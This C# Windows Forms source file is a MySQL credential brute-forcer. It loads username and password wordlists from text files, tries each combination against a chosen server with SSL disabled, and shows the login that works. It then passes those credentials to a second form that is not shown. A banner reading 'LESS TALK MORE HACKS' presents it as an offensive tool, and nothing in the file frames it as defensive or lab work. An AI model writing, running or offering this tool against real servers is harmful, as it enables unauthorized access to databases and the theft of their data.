using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MySql.Data;
using MySql.Data.MySqlClient;
using System.Collections;

namespace brute_force
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            label1.ForeColor = Color.DarkGreen;
            label2.ForeColor = Color.DarkGreen;
            label3.ForeColor = Color.DarkGreen;
            label4.ForeColor = Color.DarkGreen;
            label4.Text = "LESS TALK MORE HACKS ;))";
            label5.ForeColor = Color.DarkGreen;
            label6.ForeColor = Color.DarkGreen;
            label7.ForeColor = Color.DarkGreen;
            label8.ForeColor = Color.DarkGreen;
            button1.ForeColor = Color.DarkGreen;
            button2.ForeColor = Color.DarkGreen;
            checkBox1.ForeColor = Color.DarkGreen;
            checkBox2.ForeColor = Color.DarkGreen;
            button3.ForeColor = Color.DarkGreen;
            button4.ForeColor = Color.DarkGreen;
            label6.Text = "None";
            label7.Text = "None";
            label8.Text = "CREDENTİALS";
            listBox1.Items.Clear();
            listBox1.ForeColor = Color.DarkGreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;

        }

        public string sunucu;
        public string kullanıcı;
        public string database;
        public string pass;
        public string username_path;
        public string password_path;

        public void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            pass = textBox3.Text;
            label4.ForeColor = Color.DarkGreen;
            label6.Text = string.Empty;
            label7.Text = string.Empty;

            String line;
            ArrayList username_list = new ArrayList();
            ArrayList password_list = new ArrayList();
            MySqlConnection mysqlbaglan;


            try
            {
                StreamReader sr = new StreamReader(username_path);
                line = sr.ReadLine();

                while (line != null)
                {
                    username_list.Add(line);
                    line = sr.ReadLine();
                }
                sr.Close();
                Console.ReadLine();
            }
            catch (Exception err)
            {
                label4.Text = "Username couldn't be read: " + err.Message;
            }

            try
            {
                StreamReader sr = new StreamReader(password_path);
                line = sr.ReadLine();

                while (line != null)
                {
                    password_list.Add(line);
                    line = sr.ReadLine();
                }
                sr.Close();
                Console.ReadLine();
            }
            catch (Exception err)
            {
                label4.Text = "Password couldn't be read: "+err.Message;
            }

            if (checkBox1.Checked && checkBox2.Checked == false)
            {
                pass = textBox3.Text;
                sunucu = textBox1.Text;

                foreach(string i in username_list)
                {
                    try
                    {
                        listBox1.Items.Add("[*]" + i.ToString() + ":" + pass.ToString());
                        mysqlbaglan =new MySqlConnection("Server=" + sunucu + ";Uid=" + i.ToString() + ";Pwd=" + pass.ToString() + ";SslMode=none");
                        mysqlbaglan.Open();

                        if(mysqlbaglan.State == ConnectionState.Open)
                        {
                            label4.Text = "Connected";
                            label6.Text = "Username: "+i.ToString();
                            label7.Text = "Password: "+pass.ToString();
                            kullanıcı = i.ToString();
                            break;
                        }
                    }
                    catch
                    {
                        label4.Text = "Couldn't Connect ";
                    }
                    
                }
            }
            if(checkBox1.Checked == false && checkBox2.Checked)
            {
                sunucu = textBox1.Text;
                kullanıcı = textBox2.Text;

                foreach(string i in password_list)
                  {
                     try
                      {
                        listBox1.Items.Add("[*]" + kullanıcı.ToString() + ":" + i.ToString());
                        mysqlbaglan = new MySqlConnection("Server=" + sunucu + ";Uid=" + kullanıcı.ToString() + ";Pwd=" + i.ToString() + ";SslMode=none");
                        mysqlbaglan.Open();

                        if (mysqlbaglan.State == ConnectionState.Open)
                         {
                           label4.Text = "Connected";
                           label6.Text = "Username: " + kullanıcı.ToString();
                           label7.Text = "Password: " + i.ToString();
                           pass = i.ToString();
                           break;
                         }

                      }
                     catch
                      {
                        label4.Text = "Couldn't Connect";

                      }
                 }
            }

            if(checkBox1.Checked && checkBox2.Checked)
            {
                sunucu = textBox1.Text;
                foreach(string i in username_list)
                {
                    foreach(string j in password_list)
                    {
                        try
                        {
                            listBox1.Items.Add("[*]" + i.ToString() + ":" + j.ToString());
                            mysqlbaglan = new MySqlConnection("Server=" + sunucu + ";Uid=" + i.ToString() + ";Pwd=" + j.ToString() + ";SslMode=none");
                            mysqlbaglan.Open();
                            
                            if (mysqlbaglan.State == ConnectionState.Open)
                            {
                                label4.Text = "Connected";
                                label6.Text = "Username: " + i.ToString();
                                label7.Text = "Password: " + j.ToString();
                                kullanıcı = i.ToString();
                                pass = j.ToString();
                                break;
                            }

                        }
                        catch
                        {
                            label4.Text = "Couldn't Connect";
                        }
                    }
                }
            }  

        }

        public void button2_Click(object sender, EventArgs e)
        {
            Form2 f2 = new Form2();
            f2.sunucu = sunucu;
            f2.kullanıcı = kullanıcı;
            f2.parola = pass;
            f2.Show();
            this.Hide();
        }

        public void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                OpenFileDialog usernamefile = new OpenFileDialog();
                usernamefile.Filter = "Text File|*.txt";
                usernamefile.Title = "Choose Username.txt";
                usernamefile.ShowDialog();
                username_path = usernamefile.FileName;
                string usernamefile_name = usernamefile.SafeFileName;
                checkBox1.Text = "Selected:"+usernamefile_name;
                textBox2.Enabled = false;
                button3.Enabled = false;
                textBox2.Clear();
            }
            else
            {
                if(checkBox2.Checked)
                { button3.Enabled = false; }
                else
                { button3.Enabled = true; }
                textBox2.Enabled = true;
                textBox2.Clear();
                listBox1.Items.Clear();
                checkBox1.Text = "Choose Username List";
            }

        }

        public void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                OpenFileDialog passwordfile = new OpenFileDialog();
                passwordfile.Filter = "Text File|*.txt";
                passwordfile.Title = "Choose Password.txt";
                passwordfile.ShowDialog();
                password_path = passwordfile.FileName;
                string passwordfile_name = passwordfile.SafeFileName;
                checkBox2.Text = "Selected:"+passwordfile_name;
                textBox3.Enabled = false;
                button3.Enabled = false;
                textBox3.Clear();
            }
            else
            {
                if (checkBox1.Checked)
                { button3.Enabled = false; }
                else
                { button3.Enabled = true; }
                textBox3.Enabled = true;
                textBox3.Clear();
                listBox1.Items.Clear();
                checkBox2.Text = "Choose Password List";
            }

        }

        private void button3_Click(object sender, EventArgs e)
        {
            sunucu = textBox1.Text;
            kullanıcı = textBox2.Text;
            database = textBox4.Text;
            pass = textBox3.Text;
            label4.ForeColor = Color.DarkGreen;
            MySqlConnection mysqlbaglan = new MySqlConnection("Server=" + sunucu + ";Uid=" + kullanıcı + ";Pwd=" + pass + ";SslMode=none");
            try
            {
                mysqlbaglan.Open();
                if (mysqlbaglan.State != ConnectionState.Closed)
                {
                    label4.Text = "Connected";
                    label6.Text = "Username: " + kullanıcı;
                    label7.Text = "Password: " + pass;    
                }
                
            }
            catch
            {
                label4.Text = "Couldn't Connect";
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
